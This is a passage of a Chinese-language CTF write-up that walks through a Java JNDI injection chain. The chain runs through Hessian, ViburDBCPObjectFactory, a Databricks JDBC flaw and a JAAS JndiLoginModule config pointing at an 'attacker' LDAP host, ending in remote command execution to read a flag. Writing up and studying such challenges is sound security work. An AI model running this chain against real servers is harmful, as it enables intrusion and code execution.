</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>versionStr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>getProperty</span><span class=p>(</span><span class=s>&#34;java.version&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>javaVersion</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Integer</span><span class=p>.</span><span class=na>parseInt</span><span class=p>(</span><span class=n>versionStr</span><span class=p>.</span><span class=na>split</span><span class=p>(</span><span class=s>&#34;\\.&#34;</span><span class=p>)</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// not possible to quiet runtime warnings anymore...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// see https://bugs.openjdk.java.net/browse/JDK-8210522</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// to understand impact on Permit (i.e. it does not work</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// anymore with Java &gt;= 12)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>member</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>直接通过 JNDI 返回 Hessian 代理对象并不会立即触发 RCE，因为 <code>InitialContext.lookup</code> 仅仅返回对象，并不一定会调用其任意方法。</p><h3 id=stage-2--viburdbcpobjectfactory到-databricks-jdbc><strong>Stage 2: ViburDBCPObjectFactory到 Databricks</strong> <strong>JDBC</strong></h3><p>首先想到的是浅蓝师傅的《探索高版本 JDK 下 JNDI 漏洞的利用方法》提到的<code>LookupRef</code> 可以触发二次JNDI请求，后续会调用getClass()方法，触发hessian反序列化，但是其只存在在Tomcat 依赖中</p><p>难道这就陷入到僵局了嘛，Bro😭😭😭</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>LookupRef</span><span class=w> </span><span class=n>ref</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LookupRef</span><span class=p>(</span><span class=s>&#34;java.lang.String&#34;</span><span class=p>,</span><span class=s>&#34;look&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;factory&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;com.caucho.hessian.client.HessianProxyFactory&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//com.caucho.burlap.client.BurlapProxyFactory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;type&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;java.lang.AutoCloseable&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;url&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;http://127.0.0.1:6666/&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getObjectInstance</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>Name</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>Context</span><span class=w> </span><span class=n>nameCtx</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hashtable</span><span class=o>&lt;?</span><span class=p>,</span><span class=w> </span><span class=o>?&gt;</span><span class=w> </span><span class=n>environment</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>lookupName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Object</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>obj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>LookupRef</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Reference</span><span class=w> </span><span class=n>ref</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Reference</span><span class=p>)</span><span class=w> </span><span class=n>obj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectFactory</span><span class=w> </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>RefAddr</span><span class=w> </span><span class=n>lookupNameRefAddr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ref</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>LookupRef</span><span class=p>.</span><span class=na>LOOKUP_NAME</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>lookupNameRefAddr</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>lookupName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>lookupNameRefAddr</span><span class=p>.</span><span class=na>getContent</span><span class=p>().</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>lookupName</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>names</span><span class=p>.</span><span class=na>get</span><span class=p>().</span><span class=na>add</span><span class=p>(</span><span class=n>lookupName</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.circularReference&#34;</span><span class=p>,</span><span class=w> </span><span class=n>lookupName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>NamingException</span><span class=w> </span><span class=n>ne</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>log</span><span class=p>.</span><span class=na>warn</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=w> </span><span class=n>ne</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>throw</span><span class=w> </span><span class=n>ne</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>RefAddr</span><span class=w> </span><span class=n>factoryRefAddr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ref</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>Constants</span><span class=p>.</span><span class=na>FACTORY</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>factoryRefAddr</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Using the specified factory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>factoryClassName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>factoryRefAddr</span><span class=p>.</span><span class=na>getContent</span><span class=p>().</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Loading factory</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ClassLoader</span><span class=w> </span><span class=n>tcl</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>factoryClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>tcl</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>factoryClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tcl</span><span class=p>.</span><span class=na>loadClass</span><span class=p>(</span><span class=n>factoryClassName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>NamingException</span><span class=w> </span><span class=n>ex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.loadFailed&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>ex</span><span class=p>.</span><span class=na>initCause</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>throw</span><span class=w> </span><span class=n>ex</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>factoryClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>factoryClassName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>NamingException</span><span class=w> </span><span class=n>ex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.loadFailed&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>ex</span><span class=p>.</span><span class=na>initCause</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>throw</span><span class=w> </span><span class=n>ex</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>factoryClass</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>)</span><span class=w> </span><span class=n>factoryClass</span><span class=p>.</span><span class=na>getConstructor</span><span class=p>().</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Throwable</span><span class=w> </span><span class=n>t</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>t</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>NamingException</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            </span><span class=k>throw</span><span class=w> </span><span class=p>(</span><span class=n>NamingException</span><span class=p>)</span><span class=w> </span><span class=n>t</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>NamingException</span><span class=w> </span><span class=n>ex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.createFailed&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>ex</span><span class=p>.</span><span class=na>initCause</span><span class=p>(</span><span class=n>t</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>throw</span><span class=w> </span><span class=n>ex</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// Note: No defaults here</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>factory</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>factory</span><span class=p>.</span><span class=na>getObjectInstance</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>nameCtx</span><span class=p>,</span><span class=w> </span><span class=n>environment</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>lookupName</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.createFailed&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InitialContext</span><span class=p>().</span><span class=na>lookup</span><span class=p>(</span><span class=n>lookupName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>ref</span><span class=p>.</span><span class=na>getClassName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>result</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>clazz</span><span class=p>.</span><span class=na>isAssignableFrom</span><span class=p>(</span><span class=n>result</span><span class=p>.</span><span class=na>getClass</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sm</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=s>&#34;lookupFactory.typeMismatch&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>ref</span><span class=p>.</span><span class=na>getClassName</span><span class=p>(),</span><span class=w> </span><span class=n>lookupName</span><span class=p>,</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>NamingException</span><span class=w> </span><span class=n>ne</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NamingException</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>log</span><span class=p>.</span><span class=na>warn</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=w> </span><span class=n>ne</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=c1>// Close the resource we no longer need if we know how to do so</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>isInstance</span><span class=p>(</span><span class=n>result</span><span class=p>.</span><span class=na>getClass</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;java.lang.AutoCloseable&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>Method</span><span class=w> </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;close&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>m</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>result</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=c1>// Ignore</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=n>ne</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>names</span><span class=p>.</span><span class=na>get</span><span class=p>().</span><span class=na>remove</span><span class=p>(</span><span class=n>lookupName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/img/2026-alictf/10.png alt=img></p><p>继续分析发现还存在ViburDBCPObjectFactory 可以利用，其中，允许通过 JNDI Reference 实例化并配置一个 DataSource，且会自动调用其 <code>start()</code>方法内部调用 <code>DriverManager.getDriver(jdbcUrl)</code>，从而触发JDBC 攻击</p><p>值得庆幸的是有 Databricks JDBC 驱动且存在CVE-2024-49194 会触发JNDI注入，</p><p>搭建 HTTP 服务器，提供 <code>jaas.conf</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>Client {
</span></span><span class=line><span class=cl>   com.sun.security.auth.module.JndiLoginModule required
</span></span><span class=line><span class=cl>   user.provider.url=&#34;ldap://attacker:1389/Hessian/Exploit&#34;
</span></span><span class=line><span class=cl>   group.provider.url=&#34;test&#34;
</span></span><span class=line><span class=cl>   tryFirstPass=&#34;true&#34;;
</span></span><span class=line><span class=cl>};
</span></span></code></pre></td></tr></table></div></div><p>当 JDBC 驱动加载此配置并进行身份验证时，<code>JndiLoginModule</code> 会读取 <code>user.provider.url</code> 并执行 <code>ctx.lookup()</code>，那么整条攻击链条就瞬间闭环了</p><p><strong>攻击链路：</strong></p><ol><li><strong>Attacker</strong>: 发送 <code>X-Lookup-URL: ldap://attacker/Vibur/Exploit</code></li><li><strong>Server</strong>: JNDI lookup -> <code>ViburDBCPObjectFactory</code></li><li><strong>Vibur</strong>: 创建 DataSource -> 连接 JDBC URL</li><li><strong>JDBC</strong>: 下载 <code>http://attacker/jaas.conf</code> -> 加载 <code>JndiLoginModule</code></li><li><strong>JAAS</strong>: JndiLoginModule lookup <code>ldap://attacker/Hessian/Exploit</code></li><li><strong>Hessian</strong>: 返回 <code>HessianProxy</code> (代理 <code>DirContext</code>)</li><li><strong>JAAS</strong>: 调用 <code>proxy.search()</code> -> 触发 Hessian 请求</li><li><strong>Server</strong>: 反序列化 Hessian Payload -> <code>UnixPrintService</code> -> RCE</li><li><strong>RCE</strong>: <code>chmod 444 /flag && cat /flag</code> -> CAT FLAG</li></ol><p><img src=/img/2026-alictf/11.png alt=img></p><h3 id=stage-3--获取flag>Stage 3: 获取FLAG</h3><p>改写x1r0z 师傅的<code>JNDIMap</code> 项目修改参考 <a href=https://github.com/N1etzsche0/JNDIMap>https://github.com/N1etzsche0/JNDIMap</a></p><p><img src=/img/2026-alictf/12.png alt=img></p><p>爽！😎这才叫RCE🎶！😋👍爽！😎这才叫RCE🎶！😋👍😎这才叫RCE🎶！</p><p><img src=/img/2026-alictf/13.png alt=img></p><p>GGWP</p><p>青山不改，绿水长流。山水有相逢，下篇WP再见</p><p><img src=/img/2026-alictf/14.png alt=img></p><p>参考资料：</p><ol><li>[Magic In Java Api](<a href=https://github.com/knownsec/KCon/blob/master/2023/Magic>https://github.com/knownsec/KCon/blob/master/2023/Magic</a> In Java Api.pdf)</li><li><a href=https://tttang.com/archive/1405/>探索高版本 JDK 